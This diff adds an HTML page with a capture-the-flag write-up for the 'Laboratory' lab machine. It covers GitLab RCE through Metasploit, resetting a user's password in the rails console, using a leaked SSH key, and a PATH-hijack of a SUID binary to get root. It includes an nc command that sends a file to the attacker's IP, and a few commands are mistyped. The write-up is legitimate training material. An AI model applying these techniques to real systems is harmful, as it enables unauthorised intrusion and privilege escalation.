@@ -1,0 +1,224 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="static/css/style.css">
+</head>
+
+<body>
+    <aside>
+        <iframe src="nav.html"></iframe>
+    </aside>
+
+    <aside class="index">
+        <h1>page index</h1>
+        <ol>
+            <li><a href="#information">information</a></li>
+            <li><a href="#foothold">foothold</a></li>
+            <li><a href="#user">user</a></li>
+            <li><a href="#root">root</a></li>
+        </ol>
+    </aside>
+
+    <article>
+        <h1>Laboratory</h1>
+        <section id="information">
+            <h2>1. Information</h2>
+            <ul>
+                <li> Linux</li>
+                <li> Easy class</li>
+                <li> Released Nov 2020</li>
+                <li> Retired Apr 2021</li>
+            </ul>
+
+            <p> Laboratory is an easy-rated machine with an outdated Gitlab deployment and a usable SUID binary.</p>
+        </section>
+
+        <section id="foothold">
+            <h2>2. Foothold</h2>
+
+            <p>
+                Initial reconnaissance with <span>nmap</span> lists three open ports: SSH and HTTP/S. Opening
+                <span>http://laboratory.htb</span> will immediately redirect to HTTPS and produce a certificate warning,
+                which we accept.
+            </p>
+
+            <p>
+                The basic page is of some company named "The Laboratory" which only hints that they do some kind of
+                development and that a blog may be coming soon.</p>
+
+            <p>
+                There's no moving parts in here so we need to look a little more carefully.
+                The SSL certificate has a revealing entry, relating to the software development hint. There's a
+                <span>git.laboratory.htb</span> subdomain which we add to our hosts with <span>echo "10.10.10.216
+                    git.laboratory.htb" | sudo tee --append /etc/hosts</span>. In here we find a Gitlab instance.
+            </p>
+
+            <img src="static/img/laboratory_1.jpg" />
+            <figcaption><span>git.laboratory.htb</span> found in subject alt names</figcaption>
+
+            <p>
+                Trying to create a user will work, but the server only accepts <span>*@laboratory.htb</span> addresses.
+                After
+                creating the account, let's have a look inside.</p>
+            </p>
+
+            <p>
+                Inside there is one public project, the Laboratory home page, by a user Dexter McPherson whose username
+                here is <span>dexter</span>.
+                The <span>/help</span> page gives up the version number of this instance,
+                <span>12.8.1</span> which very quickly proves to be <a
+                    href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">vulnerable to
+                    RCE</a> and has a Metasploit module
+                available
+                at <span>multi/http/gitlab_file_read_rce</span>. Using the module does spawn a shell with user
+                <span>git</span> at
+                <span>/var/opt/gitlab/gitlab-rails/working</span>.
+            </p>
+
+        </section>
+        <section id="user">
+            <h2>3. User</h2>
+            <p>
+                The filesystem root has a
+                <span>.dockerenv</span> file which points to this shell being inside a Docker container.
+                In that case it should have some default Gitlab utils such as the
+                development console installed.
+            </p>
+
+            <code>git@git:~/gitlab-rails$ which gitlab-rails
+/opt/gitlab/bin/gitlab-rails</code>
+
+            <p>
+                The console is available. Let's fire it up and try editing the database with ActiveRecord so we may log
+                in as
+                Dexter to
+                see if there's something still hidden within Gitlab. Note that the command takes a while to load.
+            </p>
+
+            <code>git@git:~/gitlab-rails/working$ gitlab-rails console
+--------------------------------------------------------------------------------
+GitLab:       12.8.1 (d18b43a5f5a) FOSS
+GitLab Shell: 11.0.0
+PostgreSQL:   10.12
+--------------------------------------------------------------------------------
+Loading production environment (Rails 6.0.2)
+irb(main):001:0> user = User.first()
+user = User.first()
+=> #&lt;User id:1 @dexter&gt;
+irb(main):002:0> user.password = "strongatsea"
+user.password = "strongatsea"
+=> "strongatsea"
+irb(main):003:0> user.password_confirmation = "strongatsea"
+user.password_confirmation = "strongatsea"
+=> "strongatsea"
+irb(main):004:0> user.save!
+user.save!
+Enqueued ActionMailer::DeliveryJob (Job ID: 1970e159-05b8-4ef6-939d-1f0c25aa6c00) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #&lt;GlobalID:0x00007f2b0fe416f0 @uri=#&lt;URI::GID gid://gitlab/User/1>>
+=> true
+</code>
+            <p>
+                Now that <span>dexter</span>'s password has been changed, let's log in to Gitlab with their credentials.
+            </p>
+
+            <p>
+                We now find a new repository <span>SecureDocker</span>. The
+                repository has a directory structure <span>securedocker/dexter/.ssh</span>, which contains an SSH key.
+                Downloading it to the attacker as <span>dexter.key</span> we can try to use it to SSH into the machine
+                with
+                <span>ssh -i dexter.key dexter@laboratory.htb</span>.
+            </p>
+
+            <img src="static/img/laboratory_2.jpg" />
+            <figcaption>Dexter left an SSH key lying around</figcaption>
+
+            <p>
+                SSH is successful and we may now get the user key.
+            </p>
+
+            <section id="root">
+                <h2>4. Root</h2>
+
+                <p>
+                    Let's look if we can find any SUID binaries lying around with <span>find / -type f -4000
+                        2>/devn/null</span>.
+                </p>
+
+                <p>
+                    Looking at the output there is a non-standard SUID file <span>/usr/local/bin/docker-security</span>
+                    that
+                    can
+                    be executed.
+                </p>
+
+                <code>dexter@laboratory:/usr/local/bin$ file docker-security
+docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped</code>
+
+                <p>
+                    It seems that it's a binary executable. Online searching for this binary yields little results so we
+                    exfiltrate it to the attacker machine for further
+                    analysis.
+                </p>
+
+                <p>
+                    Open up a listener on the attacker with <span>nc -lvnp 4445 > docker-security.b64</span> and send it
+                    from the target with <span>cat docker-security | base64 | nc 10.10.14.74 4444</span>. Then decode it
+                    with <span>base64 -d docker-security.b64 > docker-security</span>.
+                </p>
+
+                <p>First let's look at <span>strings</span> if we can find something about the program.</p>
+
+                <code>...
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+chmod 700 /usr/bin/docker
+chmod 660 /var/run/docker.sock
+;*3$"
+GCC: (Debian 10.1.0-6) 10.1.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+...</code>
+                <figcaption>Output sample of <span>strings docker-security</span></figcaption>
+
+                <p>
+                    It seems that the binary may be using <span>chmod</span> to manipulate permissions on a Docker
+                    socket
+                    for
+                    example. It doesn't seem to have an absolute path for the binary in these strings, which may make it
+                    vulnerable to path
+                    hijacking.
+                </p>
+
+                <p>We can try this by creating a humorous <span>chmod</span>:</p>
+
+                <code>dexter@laboratory:~$ echo '#!/bin/bash' >> chmod
+dexter@laboratory:~$ echo '/bin/bash' >> chmod
+dexter@laboratory:~$ which chmod
+/usr/bin/chmod
+dexter@laboratory:~$ /usr/bin/chmod +x chmod</code>
+
+                <p>
+                    Now, we execute the <span>docker-security</span> with a prepended <span>PATH</span> in the
+                    environment so that
+                    <span>chmod</span> is found at <span>/home/dexter/chmod</span>:
+                </p>
+
+                <code>dexter@laboratory:~$ PATH=/home/dexter:$PATH /usr/local/bin/docker-security
+root@laboratory:~# id;hostname
+uid=0(root) gid=0(root) groups=0(root),1000(dexter)
+laboratory</code>
+
+                <p>Grab the root flag and we are done.</p>
+            </section>
+    </article>
+</body>
+
+</html>
